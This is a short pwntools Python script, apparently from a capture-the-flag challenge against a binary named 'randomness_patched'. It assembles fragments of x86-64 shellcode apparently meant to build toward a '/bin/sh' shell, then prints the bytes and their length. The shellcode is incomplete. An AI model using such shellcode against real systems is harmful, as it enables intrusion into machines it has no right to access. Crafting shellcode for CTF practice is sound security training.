from pwn import *
exe = ELF('randomness_patched', checksec=False)
context.binary = exe


a = asm("""
    xor eax, eax
    xor edi, edi
    jmp setnull1
    inc eax
    setnull1:
        xor esi, esi
        xor edx, edx
        jmp setbinsh1
        inc eax
    setbinsh1:
        pop rdi
        pop rdi
        jmp setbinsh2
        inc eax
    setbinsh2:
        pop rsi
    """)
print(a)
print(len(a))
